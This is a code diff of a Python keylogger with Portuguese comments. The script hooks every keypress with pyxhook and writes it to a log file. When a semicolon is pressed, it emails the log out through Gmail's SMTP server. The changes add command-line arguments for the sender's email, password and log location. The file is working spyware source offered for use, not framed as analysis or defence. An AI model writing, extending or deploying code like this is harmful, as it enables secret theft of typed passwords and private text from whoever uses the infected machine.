@@ -16,7 +16,8 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>
 
 import pyxhook
-import datetime,os
+import datetime,os,sys
+import argparse as args
 import smtplib
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
@@ -24,8 +25,27 @@ from email.MIMEText import MIMEText
 from email import Encoders
 from email.Utils import COMMASPACE, formatdate
 
+#arguments
+parser = args.ArgumentParser()
+parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
+parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
+parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
+
+parsed_args = parser.parse_args()
+
+data_hora = datetime.datetime.now()
+data_hora = str(data_hora).split('.')[0].replace(' ','_')###
+sendTo = parsed_args.email #para onde você ira enviar o arquivo
+assunto = 'Keylogger %s' %data_hora
+mensagem = ' the keylogger dumped it %s '%data_hora #mensagem é também pega a data é a hora do pc 
+youremail =parsed_args.email
+password = parsed_args.password
+servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
+porta = 587
+log_file = parsed_args.local
+
 #essa funão gerencia cria os heards dentre outras coisas 
-def envia_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[""]):
+def send_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[]):
   global saida
   servidor = servidor
   porta = porta
@@ -42,6 +62,7 @@ def envia_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[""]):
 
   for f in anexo:
     part = MIMEBase('application', 'octet-stream')
+    os.chdir(r"/")
     part.set_payload(open(f, 'rb').read())
     Encoders.encode_base64(part)
     part.add_header('Content-Disposition','attachment;filename="%s"'% os.path.basename(f))
@@ -60,21 +81,6 @@ def envia_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[""]):
     errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
     print('%s'%errorMsg)
 
-data_hora = datetime.datetime.now()
-data_hora = str(data_hora).split('.')[0].replace(' ','_')###
-
-destinatario = '' #para onde você ira enviar o arquivo
-assunto = 'Keylogger teste %s' %data_hora
-mensagem = 'teste do meu Keylogger %s '%data_hora #mensagem é também pega a data é a hora do pc 
-
-servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
-
-porta = 587
-
-remetente = '' #o seu email 
-senha = '' #a sua senha 
-log_file = "/home/mrtrue/log.txt" # o local na onde o arquivo sera salvo 
-
 def OnKeyPress(event): #essa função pega as teclas que foram precionadas
   fob=open(log_file,'a')
   fob.write(event.Key)
@@ -83,7 +89,7 @@ def OnKeyPress(event): #essa função pega as teclas que foram precionadas
   if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
     fob.close()
     new_hook.cancel()
-    envia_email(servidor, porta, remetente, senha, destinatario, assunto, mensagem,["/home/mrtrue/log.txt"])
+    send_email(servidor, porta, youremail, password, sendTo, assunto, mensagem,[log_file])
 
 new_hook = pyxhook.HookManager()
 new_hook.KeyDown= OnKeyPress
